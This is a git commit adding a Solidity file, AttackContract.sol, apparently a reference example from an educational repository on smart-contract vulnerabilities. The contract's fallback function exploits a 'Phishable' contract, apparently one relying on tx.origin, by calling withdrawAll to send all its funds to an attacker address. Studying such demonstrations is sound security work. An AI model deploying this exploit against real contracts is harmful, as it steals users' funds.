633619dbe970bfbc339c7ce007bb26999f538de0
Saxon Knight <knight7@users.noreply.github.com>
2019-03-28 14:53:20 -1000

    Add AttackContract.sol reference
    - This is the attacker's contract which exploits Phishable

---
+++ AttackContract.sol
@@ -0,0 +1,16 @@
+import "Phishable.sol";
+
+contract AttackContract {
+    Phishable phishableContract;
+
+    address attacker; // The attacker's address to receive funds
+
+    constructor (Phishable _phishableContract, address _attackerAddress) {
+        phishableContract = _phishableContract;
+        attacker = _attackerAddress;
+    }
+
+    function () payable {
+        phishableContract.withdrawAll(attacker);
+    }
+}
